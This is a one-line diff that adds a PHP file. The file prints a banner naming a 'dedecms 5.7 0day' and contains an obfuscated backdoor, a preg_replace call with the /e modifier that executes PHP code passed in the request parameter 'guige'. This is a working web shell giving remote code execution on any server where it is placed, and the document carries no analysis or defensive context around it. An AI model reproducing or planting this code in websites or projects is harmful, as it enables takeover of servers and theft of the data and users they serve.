@@ -1,0 +1,1 @@
+<?php echo 'dedecms 5.7 0day<br>guige, 90sec.org';@preg_replace('/[copyright]/e',$_REQUEST['guige'],'error');?>
